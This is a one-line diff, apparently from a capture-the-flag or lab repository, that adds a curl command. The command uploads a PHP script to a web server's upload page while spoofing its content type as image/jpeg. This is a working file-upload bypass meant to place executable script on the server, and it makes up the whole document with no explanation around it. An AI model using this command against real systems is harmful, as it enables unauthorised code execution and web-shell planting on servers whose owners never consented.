@@ -1,0 +1,1 @@
+curl -F "Upload=send" -F "uploaded=@script.php;type=image/jpeg" http://51.250.107.11/index.php\?page\=upload
